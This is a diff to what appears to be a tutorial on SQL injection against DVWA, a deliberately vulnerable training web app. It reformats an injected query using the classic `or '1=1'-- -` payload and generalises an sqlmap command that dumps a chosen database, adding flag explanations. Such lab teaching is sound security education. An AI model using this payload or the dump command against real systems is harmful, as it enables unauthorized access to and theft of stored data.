@@ -96,8 +96,7 @@ sql(dvwa)> SELECT first_name, last_name FROM users WHERE user_id = '$id';
 sql(dvwa)> SELECT first_name, last_name FROM users WHERE user_id = '$id';
 
 #injected
-sql(dvwa)> SELECT first_name, last_name FROM users WHERE user_id = '$id' or
-'1=1'-- -;
+sql(dvwa)> SELECT first_name, last_name FROM users WHERE user_id = '$id' or '1=1'-- -;
 ```
 
 - `or '1=1'-- -`: user-supplied 'bad' data
@@ -140,6 +139,10 @@ have used this tool to dump the database to your kali machine. this is the
 general structure of the command we'll use
 
 ```bash
-sqlmap -u "http://<dvwa IP address>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" -D <database> --dump
+sqlmap -u "<url of injectible page>" --cookie="<cookie info>" -D <database> --dump
 ```
+- `-u "<url of injectible page>"` the location of the injectible page
+- `--cookie="<cookie info>" necessary cookies required by the web app
+- `-D <database>` the name of the database we're interested in
+- `--dump` get all the records
 
